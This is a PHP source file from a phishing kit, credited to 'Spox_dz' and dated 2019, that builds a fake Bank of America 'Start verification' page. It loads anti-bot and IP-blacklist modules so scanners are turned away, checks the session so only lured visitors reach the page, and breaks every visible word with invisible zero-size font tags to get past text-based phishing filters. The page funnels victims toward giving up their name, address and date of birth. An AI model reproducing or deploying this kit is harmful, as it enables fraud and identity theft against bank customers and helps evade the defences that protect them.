<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * BANK OF AMERICAN -
 * version 1.0
 * Https://facebook.com/hackeeeed.html
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2019 BOA               $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';


$key = substr(sha1(mt_rand()),1,25);
$start ="verification?boa_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."";

if (!isset($_GET['boa_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['BOA_SPOX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

?>
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<title>Start verification</title>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="shortcut icon" href="Spox/Files/img/assets-images-global-favicon-favicon-CSX8d65d6e4.ico">

<link rel="stylesheet" type="text/css" href="Spox/Files/css/zk.wcs">
<link rel="stylesheet" type="text/css" href="Spox/Files/css/boa-base.css">
<link rel="stylesheet" type="text/css" href="Spox/Files/css/bcs-cdp.css">

<link rel="stylesheet" href="Spox/Files/css/normalize.css">
<link rel="stylesheet" href="Spox/Files/css/foundation.css">
<link rel="stylesheet" href="Spox/Files/css/global.css">

</head>

<body class="safari safari537 breeze">
<div  style="width:100%;height:100%;" class="z-page">
	
	<div class="z-div">
	
	
		<div class="header">
			
			<div class="z-div">
				<div  zclass="page-container" class="row header_branding-bar">
					<div class="small-12 columns">
					  
                      <span>
                         <img class="image-logo" src="Spox/Files/img/BankofAmerica_new_logo.svg" alt="Bank of America">
                       </span>
					</div>
				</div>
				<div  class="z-div">
					<div  class="row header_title-bar">
						<div class="small-12 columns">
							<h1>
								<span class="show-for-large-up">
									V<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>y y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r a<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n !
								</span>
								<span class="show-for-medium-down">
									V<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>y y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r a<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n !
								</span> 
	
	
							</h1>
						</div>
					</div></div></div>
		</div>
		<div  class="row z-div">
			<div class="small-12 large-10 columns">
				<h2 class="h2--v2"></h2>
				F<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r s<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>y r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>s, W<font style='color:transparent;font-size:0px'></font>e n<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>d t<font style='color:transparent;font-size:0px'></font>o v<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>y y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r i<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>y u<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>g i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n s<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>h a<font style='color:transparent;font-size:0px'></font>s y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r n<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e, a<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>s, o<font style='color:transparent;font-size:0px'></font>r d<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>e o<font style='color:transparent;font-size:0px'></font>f b<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>h. Y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u m<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>y al<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>o n<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>d t<font style='color:transparent;font-size:0px'></font>o a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>w<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r s<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e s<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>y q<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>s.
			</div></div>
		<span ></span>


		<div  class="row">
			<div class="z-div">
				<div class="small-12 columns">
					<a  class="button primary small" href="<?php echo $start;?>">C<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>e</a>
				</div>
			</div>
		</div>
			
			
		<div  class="footer">
			<div class="row">
				<div class="small-12 columns">
					<p class="privacy-text">
						<span  class="z-span">
							<a   class="privacy-text_link" title="Feedback">S<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e w<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>e f<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>k</a>
							<span class="z-label">|</span>
					</span>
						
			<a class="privacy-text_link" title="Privacy and Security. Link Opens in new window" name="" >P<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>v<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>y &amp; S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>y</a>
					</p>
					<p class="copyright-text">B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k o<font style='color:transparent;font-size:0px'></font>f A<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a, N.<font style='color:transparent;font-size:0px'></font>A. M<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r F<font style='color:transparent;font-size:0px'></font>D<font style='color:transparent;font-size:0px'></font>I<font style='color:transparent;font-size:0px'></font>C.
						
 						<a class="copyright-text_link" title="Equal Housing Lender information. Link opens in new window.">E<font style='color:transparent;font-size:0px'></font>q<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>l H<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>g L<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r</a></p>
					<p class="copyright-text">
						© 2<font style='color:transparent;font-size:0px'></font>0<font style='color:transparent;font-size:0px'></font>1<font style='color:transparent;font-size:0px'></font>9<font style='color:transparent;font-size:0px'></font> B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k o<font style='color:transparent;font-size:0px'></font>f
						A<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font> C<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>p<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>ti<font style='color:transparent;font-size:0px'></font>on. A<font style='color:transparent;font-size:0px'></font>ll<font style='color:transparent;font-size:0px'></font> righ<font style='color:transparent;font-size:0px'></font>ts re<font style='color:transparent;font-size:0px'></font>se<font style='color:transparent;font-size:0px'></font>rv<font style='color:transparent;font-size:0px'></font>ed.
					</p>
				</div>
			</div>
		</div>
	</div>
</div>

</body>
</html>